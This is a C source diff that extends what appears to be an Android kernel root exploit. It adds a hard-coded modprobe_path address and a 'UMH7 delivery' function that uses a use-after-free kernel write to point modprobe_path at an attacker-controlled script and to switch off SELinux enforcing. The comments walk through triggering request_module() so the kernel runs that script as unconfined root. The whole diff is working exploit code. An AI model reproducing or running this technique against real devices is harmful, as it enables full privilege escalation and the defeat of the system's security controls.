@@ -453,6 +453,9 @@ extern int esc_probe(char *out, int cap);                     /* 0 = the chain l
 
 #define C7_INIT_CRED   0xffffffc001a4ad08UL
 #define C7_INIT_GROUPS 0xffffffc001a4af80UL
+#define C7_MMP         0xffffffc001a499b8UL    /* modprobe_path (ledger 496, read off
+                                                 * this Image's own sysctl storage; the
+                                                 * runtime witness is /proc/sys/kernel/modprobe) */
 #define C7_GIVA        0xffffffc001a41b50UL    /* group_info host: inside `envp_init` (0x1a41ad0..0x1a41be0,
                                                  * 272 B of boot-only data -- init/main.c reads it exactly
                                                  * once, at run_init_process, and nothing touches it after).
@@ -1563,6 +1566,79 @@ static int daemon_proof(int pid)
            got_pid, got_uid, pid);
     fflush(stdout);
     return 0;
+}
+
+/* UMH7 delivery (ledger 2026-10-28): skip the needle/task/cred ladder entirely.
+ *
+ * The iovec-UAF write channel aims at FIXED .data addresses, so the two writes
+ * below need no task VA, no leak rounds and no borrow window -- the same
+ * primitive ladder7 already proves one step at a time (its k4(C7_ENFORCE,0)
+ * lands while unborrowed, and the runtime witness is the selinuxfs readback):
+ *
+ *   1. overwrite modprobe_path with a script we control;
+ *   2. clear selinux_enforcing so the usermode helper execs unconfined.
+ *
+ * Then we exit.  The CALLER triggers request_module() (an unregistered address
+ * family via socket()), the kernel execs the script as a full root in the
+ * kernel domain, and the script -- running uid 0 with enforcing off -- restores
+ * modprobe_path through /proc/sys (an ordinary procfs write, no kernel write
+ * needed), starts the daemon and flips enforcing back.  What makes this faster
+ * than the ladder is what it does NOT do: no task scan (the task VA changes
+ * every boot and the needle needs 8-13 lotteried rounds to name it), no
+ * task->cred write (the firmware repairs that field within seconds -- the two
+ * measured reboots both landed on it), no borrow window at all. */
+static int umh7_delivery(void)
+{
+	static const char script[] = "/data/local/tmp/umh7.sh";
+	char cur[128];
+	FILE *f;
+	int now;
+
+	if (sizeof script > 64) {	/* one writer payload */
+		printf("  UMH7: script path too long for one payload\n");
+		return 1;
+	}
+	printf("  UMH7: writing modprobe_path -> %s\n", script);
+	fflush(stdout);
+	if (!cw(C7_MMP, script, sizeof script)) {
+		printf("  UMH7: modprobe_path write did not land\n");
+		return 1;
+	}
+	/* Runtime witness: /proc/sys/kernel/modprobe reads back exactly what the
+	 * kernel will exec.  This is the same "refuse not fail" rule the ladder
+	 * uses for its selinuxfs readback. */
+	f = fopen("/proc/sys/kernel/modprobe", "r");
+	if (!f || !fgets(cur, sizeof cur, f)) {
+		printf("  UMH7: cannot read /proc/sys/kernel/modprobe back\n");
+		if (f)
+			fclose(f);
+		return 1;
+	}
+	fclose(f);
+	printf("  UMH7: modprobe_path now reads: %s", cur);
+	fflush(stdout);
+	if (strncmp(cur, script, sizeof script - 1) != 0) {
+		printf("  UMH7: MISMATCH -- refusing to touch enforcing\n");
+		return 1;
+	}
+	printf("  UMH7: clearing selinux_enforcing\n");
+	fflush(stdout);
+	if (!k4(C7_ENFORCE, 0)) {
+		printf("  UMH7: enforce write did not land\n");
+		return 1;
+	}
+	f = fopen("/sys/fs/selinux/enforce", "r");
+	now = f ? fgetc(f) : '?';
+	if (f)
+		fclose(f);
+	printf("  UMH7: enforce file now reads '%c' (want '0')\n", now);
+	fflush(stdout);
+	if (now != '0')
+		return 1;
+	printf("  UMH7: delivered -- trigger request_module() now (umhtrig); the kernel "
+	       "execs %s, which starts the daemon and closes this window\n", script);
+	fflush(stdout);
+	return 0;
 }
 
 static int ladder7(const char *daemon)
@@ -3475,6 +3551,13 @@ int main(int argc, char **argv)
                 sigemptyset(&sa.sa_mask);
                 for (k = 0; k < sizeof sgns / sizeof *sgns; k++)
                     sigaction(sgns[k], &sa, NULL);
+            }
+            if (getenv("UMH7")) {
+                int rc = umh7_delivery();
+
+                printf("  UMH7 result=%d\n", rc);
+                fflush(stdout);
+                return rc;	/* the caller triggers; the kernel-side script finishes */
             }
             if (getenv("LADDER7")) {
                 int lrc = ladder7(getenv("DAEMON7"));
